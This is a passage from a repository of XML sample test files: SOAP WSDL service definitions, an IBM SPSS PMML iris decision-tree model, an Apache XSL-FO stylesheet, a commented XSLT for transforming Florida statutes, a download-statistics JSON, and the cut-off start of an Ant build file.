      <wsdl:input>
        <soap:body use="literal" />
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal" />
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="Calculator">
    <wsdl:port name="CalculatorSoap" binding="tns:CalculatorSoap">
      <soap:address location="http://www.dneonline.com/calculator.asmx" />
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>
</file>

<file path="sample_data/test_files/small/wsdl/mulesoft-tshirt-soap.wsdl">
<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:ms="http://mulesoft.org/tshirt-service" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" name="TshirtService" targetNamespace="http://mulesoft.org/tshirt-service">
   <wsdl:types>
      <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" targetNamespace="http://mulesoft.org/tshirt-service">
         <xsd:element name="ListInventory">
            <xsd:complexType>
               <xsd:sequence />
            </xsd:complexType>
         </xsd:element>
         <xsd:element name="ListInventoryResponse">
            <xsd:complexType>
               <xsd:sequence>
                  <xsd:element name="inventory" type="ms:InventoryItem" maxOccurs="unbounded" minOccurs="1" />
               </xsd:sequence>
            </xsd:complexType>
         </xsd:element>
         <xsd:complexType name="InventoryItem">
            <xsd:sequence>
               <xsd:element name="productCode" type="xsd:string" />
               <xsd:element name="size" type="ms:Size" />
               <xsd:element name="description" type="xsd:string" />
               <xsd:element name="count" type="xsd:integer" />
            </xsd:sequence>
         </xsd:complexType>
         <xsd:simpleType name="Size">
            <xsd:restriction base="xsd:string">
               <xsd:enumeration value="S" />
               <xsd:enumeration value="M" />
               <xsd:enumeration value="L" />
               <xsd:enumeration value="XL" />
               <xsd:enumeration value="XXL" />
            </xsd:restriction>
         </xsd:simpleType>
         <xsd:element name="OrderTshirt">
            <xsd:complexType>
               <xsd:sequence>
                  <xsd:element name="size" type="ms:Size" />
                  <xsd:element name="email" type="xsd:string" />
                  <xsd:element name="name" type="xsd:string" />
                  <xsd:element name="address1" type="xsd:string" />
                  <xsd:element name="address2" type="xsd:string" />
                  <xsd:element name="city" type="xsd:string" />
                  <xsd:element name="stateOrProvince" type="xsd:string" />
                  <xsd:element name="postalCode" type="xsd:string" />
                  <xsd:element name="country" type="xsd:string" />
               </xsd:sequence>
            </xsd:complexType>
         </xsd:element>
         <xsd:element name="OrderTshirtResponse">
            <xsd:complexType>
               <xsd:all>
                  <xsd:element name="orderId" type="xsd:string" />
               </xsd:all>
            </xsd:complexType>
         </xsd:element>
         <xsd:element name="TrackOrder">
            <xsd:complexType>
               <xsd:sequence>
                  <xsd:element name="email" type="xsd:string" />
                  <xsd:element name="orderId" type="xsd:string" />
               </xsd:sequence>
            </xsd:complexType>
         </xsd:element>
         <xsd:element name="TrackOrderResponse">
            <xsd:complexType>
               <xsd:all>
                  <xsd:element name="orderId" type="xsd:string" />
                  <xsd:element name="status" type="xsd:string" />
                  <xsd:element name="size" type="ms:Size" />
               </xsd:all>
            </xsd:complexType>
         </xsd:element>
         <xsd:element name="AuthenticationHeader">
            <xsd:complexType>
               <xsd:sequence>
                  <xsd:element name="apiKey" type="xsd:string" />
               </xsd:sequence>
            </xsd:complexType>
         </xsd:element>
         <xsd:element name="APIUsageInformation">
            <xsd:complexType>
               <xsd:sequence>
                  <xsd:element name="apiCallsRemaining" type="xsd:integer" />
               </xsd:sequence>
            </xsd:complexType>
         </xsd:element>
         <xsd:element name="TshirtFault">
            <xsd:complexType>
               <xsd:sequence>
                  <xsd:element name="errorrStuff" type="xsd:integer" />
               </xsd:sequence>
            </xsd:complexType>
         </xsd:element>
      </xsd:schema>
   </wsdl:types>
   <wsdl:message name="OrderTshirt">
      <wsdl:part name="body" element="ms:OrderTshirt" />
   </wsdl:message>
   <wsdl:message name="OrderTshirtResponse">
      <wsdl:part name="body" element="ms:OrderTshirtResponse" />
   </wsdl:message>
   <wsdl:message name="ListInventory">
      <wsdl:part name="body" element="ms:ListInventory" />
   </wsdl:message>
   <wsdl:message name="ListInventoryResponse">
      <wsdl:part name="body" element="ms:ListInventoryResponse" />
   </wsdl:message>
   <wsdl:message name="TrackOrder">
      <wsdl:part name="body" element="ms:TrackOrder" />
   </wsdl:message>
   <wsdl:message name="TrackOrderResponse">
      <wsdl:part name="body" element="ms:TrackOrderResponse" />
   </wsdl:message>
   <wsdl:message name="TshirtFault">
      <wsdl:part name="fault" element="ms:TshirtFault" />
   </wsdl:message>
   <wsdl:message name="APIUsageInformation">
      <wsdl:part name="header" element="ms:APIUsageInformation" />
   </wsdl:message>
   <wsdl:message name="AuthenticationHeader">
      <wsdl:part name="header" element="ms:AuthenticationHeader" />
   </wsdl:message>
   <!-- wsdl:portType describes messages in an operation -->
   <wsdl:portType name="TshirtServicePortType">
      <wsdl:operation name="OrderTshirt">
         <wsdl:input message="ms:OrderTshirt" />
         <wsdl:output message="ms:OrderTshirtResponse" />
         <wsdl:fault name="TshirtFault" message="ms:TshirtFault" />
      </wsdl:operation>
      <wsdl:operation name="ListInventory">
         <wsdl:input message="ms:ListInventory" />
         <wsdl:output message="ms:ListInventoryResponse" />
         <wsdl:fault name="TshirtFault" message="ms:TshirtFault" />
      </wsdl:operation>
      <wsdl:operation name="TrackOrder">
         <wsdl:input message="ms:TrackOrder" />
         <wsdl:output message="ms:TrackOrderResponse" />
         <wsdl:fault name="TshirtFault" message="ms:TshirtFault" />
      </wsdl:operation>
   </wsdl:portType>
   <wsdl:binding name="TshirtServiceSoapBinding" type="ms:TshirtServicePortType">
      <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http" />
      <wsdl:operation name="OrderTshirt">
         <soap:operation soapAction="http://mulesoft.org/tshirt-service/order-tshirt" />
         <wsdl:input>
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
            <soap:header use="literal" part="header" message="ms:AuthenticationHeader" />
         </wsdl:input>
         <wsdl:output>
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
            <soap:header use="literal" part="header" message="ms:APIUsageInformation" />
         </wsdl:output>
         <wsdl:fault name="TshirtFault">
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
            <soap:header use="literal" part="header" message="ms:APIUsageInformation" />
         </wsdl:fault>
      </wsdl:operation>
      <wsdl:operation name="ListInventory">
         <soap:operation soapAction="http://mulesoft.org/tshirt-service/list-inventory" />
         <wsdl:input>
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
         </wsdl:input>
         <wsdl:output>
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
         </wsdl:output>
         <wsdl:fault name="TshirtFault">
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
         </wsdl:fault>
      </wsdl:operation>
      <wsdl:operation name="TrackOrder">
         <soap:operation soapAction="http://mulesoft.org/tshirt-service/track-order" />
         <wsdl:input>
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
            <soap:header use="literal" part="header" message="ms:AuthenticationHeader" />
         </wsdl:input>
         <wsdl:output>
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
            <soap:header use="literal" part="header" message="ms:APIUsageInformation" />
         </wsdl:output>
         <wsdl:fault name="TshirtFault">
            <soap:body use="literal" namespace="http://mulesoft.org/tshirt-service" />
         </wsdl:fault>
      </wsdl:operation>
   </wsdl:binding>
   <wsdl:service name="TshirtService">
      <wsdl:documentation />
      <!-- connect it to the binding "EndorsementSearchSoapBinding" above -->
      <wsdl:port name="TshirtServicePort" binding="ms:TshirtServiceSoapBinding">
         <!-- give the binding an network address -->
         <soap:address location="http://localhost:8088/tshirtService" />
      </wsdl:port>
   </wsdl:service>
</wsdl:definitions>
</file>

<file path="sample_data/test_files/small/wsdl/sample-1.1-soap.wsdl">
<?xml version="1.0"?>
<definitions name="TestService" 
	targetNamespace="http://tempuri.org/"
	xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
	xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" 
	xmlns:xsd="http://www.w3.org/2001/XMLSchema"
	xmlns:tns="http://tempuri.org/"
	xmlns="http://schemas.xmlsoap.org/wsdl/">

	<types>
		<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema"
			targetNamespace="http://tempuri.org/">

			<xsd:element name="TestRequest">
				<xsd:complexType>
					<xsd:sequence>
						<xsd:element name="message" type="xsd:string" />
					</xsd:sequence>
				</xsd:complexType>
			</xsd:element>

			<xsd:element name="TestResponse">
				<xsd:complexType>
					<xsd:sequence>
						<xsd:element name="response" type="xsd:string" />
					</xsd:sequence>
				</xsd:complexType>
			</xsd:element>
		</xsd:schema>
	</types>

	<message name="TestRequestMessage">
		<part name="TestRequestPart" element="tns:TestRequest" />
	</message>
	<message name="TestResponseMessage">
		<part name="TestResponsePart" element="tns:TestResponse" />
	</message>

	<portType name="TestPortType">
		<operation name="SendMessage">
			<input name="TestInput" message="tns:TestRequestMessage" />
			<output name="TestOutput" message="tns:TestResponseMessage" />
		</operation>
	</portType>

	<binding name="TestBinding" type="tns:TestPortType">
		<soap12:binding transport="http://schemas.xmlsoap.org/soap/http" style="document" />
		<operation name="SendMessage">
			<soap12:operation soapActionRequired="false"/>
			<input name="TestInput">
				<soap12:body use="literal" />
			</input>
			<output name="TestOutput">
				<soap12:body use="literal" />
			</output>
		</operation>
	</binding>

	<service name="TestService">
		<port name="TestPort" binding="tns:TestBinding">
			<soap12:address location="http://tempuri.org/testservice" />
		</port>
	</service>


</definitions>
</file>

<file path="sample_data/test_files/small/xbrl/watson-iris-pmml.xml">
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<PMML version="4.2" xmlns="http://www.dmg.org/PMML-4_2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.dmg.org/PMML-4_2 pmml-4-2.xsd">
  <Header copyright="Copyright(c) IBM Corp. 1989-2015. All rights reserved.">
    <Application name="IBM SPSS Modeler Common" version="18.0.0.0"/>
    <Timestamp/>
</Header>
  <DataDictionary numberOfFields="5">
    <DataField dataType="double" displayName="Sepal.Length" isCyclic="0" name="Sepal.Length" optype="continuous"/>
    <DataField dataType="double" displayName="Sepal.Width" isCyclic="0" name="Sepal.Width" optype="continuous"/>
    <DataField dataType="double" displayName="Petal.Length" isCyclic="0" name="Petal.Length" optype="continuous"/>
    <DataField dataType="double" displayName="Petal.Width" isCyclic="0" name="Petal.Width" optype="continuous"/>
    <DataField dataType="string" displayName="Species" isCyclic="0" name="Species" optype="categorical">
      <Value displayValue="setosa" property="valid" value="setosa"/>
      <Value displayValue="versicolor" property="valid" value="versicolor"/>
      <Value displayValue="virginica" property="valid" value="virginica"/>
</DataField>
</DataDictionary>
  <TreeModel algorithmName="CHAID" functionName="classification">
    <Extension extender="spss.com">
      <X-risk value="0.0266666666666667"/>
      <X-seOfRisk value="0.01315435429951"/>
</Extension>
    <MiningSchema>
      <MiningField importance="0.792654" name="Petal.Width" usageType="active"/>
      <MiningField importance="0.128223" name="Sepal.Width" usageType="active"/>
      <MiningField importance="0.0791228" name="Petal.Length" usageType="active"/>
      <MiningField name="Species" usageType="predicted"/>
</MiningSchema>
    <ModelStats>
      <UnivariateStats field="Petal.Width">
        <Counts invalidFreq="0" missingFreq="0" totalFreq="150"/>
        <NumericInfo maximum="9" minimum="0"/>
</UnivariateStats>
      <UnivariateStats field="Sepal.Width">
        <Counts invalidFreq="0" missingFreq="0" totalFreq="150"/>
        <NumericInfo maximum="9" minimum="0"/>
</UnivariateStats>
      <UnivariateStats field="Petal.Length">
        <Counts invalidFreq="0" missingFreq="0" totalFreq="150"/>
        <NumericInfo maximum="9" minimum="0"/>
</UnivariateStats>
</ModelStats>
    <Node defaultChild="1" id="0" recordCount="150" score="setosa">
      <Extension>
        <X-Node>
          <X-NodeStats adjPValue="4.75967387732713e-051" chiSquare="258.699665551839" df1="6"/>
</X-Node>
</Extension>
      <True/>
      <ScoreDistribution confidence="0.333333333333333" probability="0.333333333333333" recordCount="50" value="setosa">
        <Extension extender="spss.com" name="probability" value="0.333333333333333"/>
</ScoreDistribution>
      <ScoreDistribution confidence="0.333333333333333" probability="0.333333333333333" recordCount="50" value="versicolor">
        <Extension extender="spss.com" name="probability" value="0.333333333333333"/>
</ScoreDistribution>
      <ScoreDistribution confidence="0.333333333333333" probability="0.333333333333333" recordCount="50" value="virginica">
        <Extension extender="spss.com" name="probability" value="0.333333333333333"/>
</ScoreDistribution>
      <Node id="1" recordCount="48" score="setosa">
        <CompoundPredicate booleanOperator="surrogate">
          <CompoundPredicate booleanOperator="and">
            <True/>
            <SimplePredicate field="Petal.Width" operator="lessOrEqual" value="0.4"/>
</CompoundPredicate>
          <True/>
</CompoundPredicate>
        <ScoreDistribution confidence="1" probability="1" recordCount="48" value="setosa">
          <Extension extender="spss.com" name="probability" value="1"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="versicolor">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="virginica">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
</Node>
      <Node defaultChild="5" id="2" recordCount="30" score="versicolor">
        <Extension>
          <X-Node>
            <X-NodeStats adjPValue="2.5922778346965e-007" chiSquare="30" df1="1"/>
</X-Node>
</Extension>
        <CompoundPredicate booleanOperator="surrogate">
          <CompoundPredicate booleanOperator="and">
            <SimplePredicate field="Petal.Width" operator="greaterThan" value="0.4"/>
            <SimplePredicate field="Petal.Width" operator="lessOrEqual" value="1.3"/>
</CompoundPredicate>
          <False/>
</CompoundPredicate>
        <ScoreDistribution confidence="0.0666666666666667" probability="0.0666666666666667" recordCount="2" value="setosa">
          <Extension extender="spss.com" name="probability" value="0.0666666666666667"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.933333333333333" probability="0.933333333333333" recordCount="28" value="versicolor">
          <Extension extender="spss.com" name="probability" value="0.933333333333333"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="virginica">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
        <Node id="5" recordCount="28" score="versicolor">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <True/>
              <SimplePredicate field="Sepal.Width" operator="lessOrEqual" value="3"/>
</CompoundPredicate>
            <True/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="1" probability="1" recordCount="28" value="versicolor">
            <Extension extender="spss.com" name="probability" value="1"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="virginica">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
</Node>
        <Node id="6" recordCount="2" score="setosa">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <SimplePredicate field="Sepal.Width" operator="greaterThan" value="3"/>
              <True/>
</CompoundPredicate>
            <False/>
</CompoundPredicate>
          <ScoreDistribution confidence="1" probability="1" recordCount="2" value="setosa">
            <Extension extender="spss.com" name="probability" value="1"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="virginica">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
</Node>
</Node>
      <Node defaultChild="7" id="3" recordCount="26" score="versicolor">
        <Extension>
          <X-Node>
            <X-NodeStats adjPValue="0.00465122067170656" chiSquare="11.2996825396825" df1="1"/>
</X-Node>
</Extension>
        <CompoundPredicate booleanOperator="surrogate">
          <CompoundPredicate booleanOperator="and">
            <SimplePredicate field="Petal.Width" operator="greaterThan" value="1.3"/>
            <SimplePredicate field="Petal.Width" operator="lessOrEqual" value="1.7"/>
</CompoundPredicate>
          <False/>
</CompoundPredicate>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.807692307692308" probability="0.807692307692308" recordCount="21" value="versicolor">
          <Extension extender="spss.com" name="probability" value="0.807692307692308"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.192307692307692" probability="0.192307692307692" recordCount="5" value="virginica">
          <Extension extender="spss.com" name="probability" value="0.192307692307692"/>
</ScoreDistribution>
        <Node id="7" recordCount="20" score="versicolor">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <True/>
              <SimplePredicate field="Petal.Length" operator="lessOrEqual" value="4.9"/>
</CompoundPredicate>
            <True/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.95" probability="0.95" recordCount="19" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0.95"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.05" probability="0.05" recordCount="1" value="virginica">
            <Extension extender="spss.com" name="probability" value="0.05"/>
</ScoreDistribution>
</Node>
        <Node id="8" recordCount="6" score="virginica">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <SimplePredicate field="Petal.Length" operator="greaterThan" value="4.9"/>
              <True/>
</CompoundPredicate>
            <False/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.333333333333333" probability="0.333333333333333" recordCount="2" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0.333333333333333"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.666666666666667" probability="0.666666666666667" recordCount="4" value="virginica">
            <Extension extender="spss.com" name="probability" value="0.666666666666667"/>
</ScoreDistribution>
</Node>
</Node>
      <Node defaultChild="10" id="4" recordCount="46" score="virginica">
        <Extension>
          <X-Node>
            <X-NodeStats adjPValue="0.0271214034627571" chiSquare="6.81481481481481" df1="1"/>
</X-Node>
</Extension>
        <CompoundPredicate booleanOperator="surrogate">
          <CompoundPredicate booleanOperator="and">
            <SimplePredicate field="Petal.Width" operator="greaterThan" value="1.7"/>
            <True/>
</CompoundPredicate>
          <False/>
</CompoundPredicate>
        <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
          <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.0217391304347826" probability="0.0217391304347826" recordCount="1" value="versicolor">
          <Extension extender="spss.com" name="probability" value="0.0217391304347826"/>
</ScoreDistribution>
        <ScoreDistribution confidence="0.978260869565217" probability="0.978260869565217" recordCount="45" value="virginica">
          <Extension extender="spss.com" name="probability" value="0.978260869565217"/>
</ScoreDistribution>
        <Node id="9" recordCount="6" score="virginica">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <True/>
              <SimplePredicate field="Petal.Length" operator="lessOrEqual" value="4.9"/>
</CompoundPredicate>
            <False/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.166666666666667" probability="0.166666666666667" recordCount="1" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0.166666666666667"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0.833333333333333" probability="0.833333333333333" recordCount="5" value="virginica">
            <Extension extender="spss.com" name="probability" value="0.833333333333333"/>
</ScoreDistribution>
</Node>
        <Node id="10" recordCount="40" score="virginica">
          <CompoundPredicate booleanOperator="surrogate">
            <CompoundPredicate booleanOperator="and">
              <SimplePredicate field="Petal.Length" operator="greaterThan" value="4.9"/>
              <True/>
</CompoundPredicate>
            <True/>
</CompoundPredicate>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="setosa">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="0" probability="0" recordCount="0" value="versicolor">
            <Extension extender="spss.com" name="probability" value="0"/>
</ScoreDistribution>
          <ScoreDistribution confidence="1" probability="1" recordCount="40" value="virginica">
            <Extension extender="spss.com" name="probability" value="1"/>
</ScoreDistribution>
</Node>
</Node>
</Node>
    <Extension>
      <X-TreeModel>
        <X-Priors>
          <X-Prior-Value targetCategory="setosa" value="0.333333333333333"/>
          <X-Prior-Value targetCategory="versicolor" value="0.333333333333333"/>
          <X-Prior-Value targetCategory="virginica" value="0.333333333333333"/>
</X-Priors>
</X-TreeModel>
</Extension>
</TreeModel>
</PMML>
</file>

<file path="sample_data/test_files/small/xslfo/projectteam-to-fo.xsl">
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<!-- $Id$ -->
<xsl:stylesheet version="1.1" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:fo="http://www.w3.org/1999/XSL/Format" exclude-result-prefixes="fo">
  <xsl:output method="xml" version="1.0" omit-xml-declaration="no" indent="yes"/>
  <xsl:param name="versionParam" select="'1.0'"/> 
  <!-- ========================= -->
  <!-- root element: projectteam -->
  <!-- ========================= -->
  <xsl:template match="projectteam">
    <fo:root xmlns:fo="http://www.w3.org/1999/XSL/Format">
      <fo:layout-master-set>
        <fo:simple-page-master master-name="simpleA4" page-height="29.7cm" page-width="21cm" margin-top="2cm" margin-bottom="2cm" margin-left="2cm" margin-right="2cm">
          <fo:region-body/>
        </fo:simple-page-master>
      </fo:layout-master-set>
      <fo:page-sequence master-reference="simpleA4">
        <fo:flow flow-name="xsl-region-body">
          <fo:block font-size="16pt" font-weight="bold" space-after="5mm">Project: <xsl:value-of select="projectname"/>
          </fo:block>
          <fo:block font-size="12pt" space-after="5mm">Version <xsl:value-of select="$versionParam"/>
          </fo:block>
          <fo:block font-size="10pt">
            <fo:table table-layout="fixed" width="100%" border-collapse="separate">
              <fo:table-column column-width="4cm"/>
              <fo:table-column column-width="4cm"/>
              <fo:table-column column-width="5cm"/>
              <fo:table-body>
                <xsl:apply-templates select="member"/>
              </fo:table-body>
            </fo:table>
          </fo:block>
        </fo:flow>
      </fo:page-sequence>
    </fo:root>
  </xsl:template>
  <!-- ========================= -->
  <!-- child element: member     -->
  <!-- ========================= -->
  <xsl:template match="member">
    <fo:table-row>
      <xsl:if test="function = 'lead'">
        <xsl:attribute name="font-weight">bold</xsl:attribute>
      </xsl:if>
      <fo:table-cell>
        <fo:block>
          <xsl:value-of select="name"/>
        </fo:block>
      </fo:table-cell>
      <fo:table-cell>
        <fo:block>
          <xsl:value-of select="function"/>
        </fo:block>
      </fo:table-cell>
      <fo:table-cell>
        <fo:block>
          <xsl:value-of select="email"/>
        </fo:block>
      </fo:table-cell>
    </fo:table-row>
  </xsl:template>
</xsl:stylesheet>
</file>

<file path="sample_data/test_files/small/xslt/legal-codes-transform.xsl">
<?xml version="1.0" encoding="UTF-8" ?>

<!--
	Sample State Decoded Extensible Stylesheet Language Transformation
	
	Takes Florida Statutes XML <http://www.sunshinestatutes.com/downloads/>, as provided by the
	state legislature, and transforms them into The State Decoded's XML format. This is intended as
	a sample for others to modify, to transform their own legal code's XML into The State Decoded's
	format.
	
	Created by Josh Brown, LightCastle Technical Consulting.
	Released under the GNU Public License v3.0.
-->

<!--You'll notice farther down in this XSLT some of the XPaths follow patterns of
	"orig:Chapter/orig:TitleNumber". This tells the XSLT processor to look for the XPath of
	Chapter/TitleNumber in the document that is namespaced to "orig". If you have no namespace in
	the original document, remove the xmlns:orig= line in this stylesheet and all the "orig:"
	prefixes to XPaths. -->
			
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:orig="http://StatRev.xsd">

	<xsl:preserve-space elements="*"/>
	
	<xsl:output
			method="xml"
			version="1.0"
			encoding="utf-8"
			omit-xml-declaration="no"
			indent="yes"
			media-type="text/xml"/>

	<!--Start processing at the top-level element. This will match on the root tag in the input
		document. (The first tag that isn't "<xml>" is the root tag.) For example, if the match is
		set for the fourth tag in the document, nothing in the second or third tags would make it
		into the output document. You should almost always match on the root element.
	-->
	<xsl:template match="/">

		<!--Set a variable called "docpath" so we only have to perform a single concat. This
			variable lets the XSLT find the name of the file in the next directory up that it needs
			to open. The substring-before() function remove values from the first parameter that
			occur in the string before the second parameter. So if "orig:Section/@Number" is
			"0001.01", and the second parameter is ".", substring-before will return the value
			"0001". So in effect, this is how the XSLT processor knows which file to open:
			"0001.xml" in the directory above the one where the instant XSLT file is located. -->
		<xsl:variable name="docpath" select="document(concat('../', substring-before(orig:Section/@Number, '.'), '.xml'))"/>

		<!--Begin to output the text of this law. -->
		<law>

			<structure>
				 <xsl:apply-templates select="$docpath/orig:Chapter/orig:TitleName"/>
				 <xsl:apply-templates select="$docpath/orig:Chapter/orig:ChapterName"/>
			</structure>
			
			
			<!--"select='@Number'" tells the XSLT to use the value of the "Number" property on the
				tag that it locates. Because this is follows "value-of select='orig:Section'", it
				finds the Number property of the <Section> tag of the source XML document. -->

			<section_number><xsl:value-of select="orig:Section/@Number"/></section_number>

			<!--Replace "<xsl:value-of select="orig:Section/orig:Catchline"/>" with whatever is
				the contents of the <Catchline> tag in the source XML. -->
			<catch_line><xsl:value-of select="orig:Section/orig:Catchline"/></catch_line>

			<text>
				<!--This will apply all templates that match children nodes of orig:Section in the
					sub-directory Sections/ -->
				<xsl:apply-templates/>
			</text>
			
			<!--Each time the XSLT processor encounters an orig:Section tag in the top-level
				source document, it opens up the corresponding Sections flie and sets the
				<history> tag to the corresponding <History> tag. -->
			<history><xsl:value-of select="orig:Section/orig:History"/></history>

		</law>
		
	</xsl:template>



	<xsl:template match="orig:TitleName" name="TitleName">
			
				<!--The <xsl:attribute> tag sets an attribute on the tag that it sits inside, in
					this case <unit>. The attribute will be titled whatever is in the "name="
					section, and the value will be whatever is inside the <xsl:attribute> tags. In
					this case, this will set attributes of "identifier=" "order_by=" and "level=" on
					the <unit> tag. Values for those, respectively, will be the title number from
					the input XML doc, the <order_by> tag and the number 1. The statement
					<xsl:value-of select="."/> will set the value of the <unit> tag to be whatever
					the value of the <TitleName> tag is from the original document, because a dot
					(.) is the XPath shorthand for the current tag. Because this template matches on
					"orig:TitleName", that makes that tag the current tag. -->
				<unit label="title">
						<xsl:attribute name="identifier"><xsl:value-of select="../@TitleNumber"/></xsl:attribute>
						<xsl:attribute name="order_by"><xsl:value-of select="../@TitleNumber"/></xsl:attribute>
						<xsl:attribute name="level">1</xsl:attribute>
						<xsl:value-of select="."/>
				</unit>

	</xsl:template>

	<xsl:template match="orig:ChapterName" name="ChapterName">
				<unit label="chapter">
					<xsl:attribute name="identifier"><xsl:value-of select="../orig:ChapterNumber"/></xsl:attribute>
					<xsl:attribute name="order_by"><xsl:value-of select="@Number"/></xsl:attribute>
					<xsl:attribute name="level">2</xsl:attribute>
					<xsl:value-of select = "."/>
				</unit>
	</xsl:template>

	<xsl:template match="orig:SectionBody">
		<section>
		<xsl:apply-templates/></section>
	</xsl:template>

	<xsl:template match="orig:Text">
		<xsl:apply-templates/>
	</xsl:template>

	<xsl:template match="orig:Catchline"/>

	<xsl:template match="orig:Subsection">
		<section>
		<xsl:attribute name = "prefix"><xsl:value-of select="@Id"/></xsl:attribute>
		<xsl:apply-templates/></section>
	</xsl:template>

	<xsl:template match="orig:Paragraph">
		<section>
		<xsl:attribute name="prefix"><xsl:value-of select="@Id"/></xsl:attribute>
		<xsl:apply-templates/></section>
	</xsl:template>

	<!--We're making an empty history template so that the XSLT will remove values for this tag in
		the source document. We've already told the XSLT processor earlier in this document what we
		want to do with this History tag.  -->
	<xsl:template match="orig:History">
	</xsl:template>
	
	<!--The Metadata template is unused for the example XML, but may be used for other legal codes. -->
	<xsl:template match="orig:Metadata">
		<metadata></metadata>
	</xsl:template>

	<!--The Tags template is unused for the example XML, but may be used for other legal codes. -->
	<xsl:template match="orig:Tags">
		<tags>
			<tag></tag>
		</tags>
	</xsl:template>

	<xsl:template match="orig:Order">
		<order_by></order_by>
	</xsl:template>

	<!-- This template will match on any child node of <Note> in a document. In Florida's XML (e.g.,
		0001.01.xml) there is a <Note><Text>[text]</Text></Note> section. Because we have a template
		that matches on nodes titled "<Text>", this value was being put into the transformed XML
		document. We don't want this to happen, because our "<text>" field means something very
		different than the source XML's "<Text>" field. This template handles that by selecting any
		children nodes of <Note> and doing nothing with the values found there, which functionally
		deletes the information from the transformed document. -->
	<xsl:template match="orig:Note/*"></xsl:template>
	
</xsl:stylesheet>
</file>

<file path="sample_data/test_files/download_stats.json">
{
  "total": 31,
  "success": 3,
  "failed": 2,
  "skipped": 28,
  "sizes": {
    "small": 2,
    "medium": 1,
    "large": 0
  }
}
</file>

<file path="sample_data/test_files_synthetic/small/ant/build.xml">
<?xml version="1.0" encoding="UTF-8"?>
<project name="sample-java-app" default="build" basedir="." xmlns:ivy="antlib:org.apache.ivy.ant">

  <description>
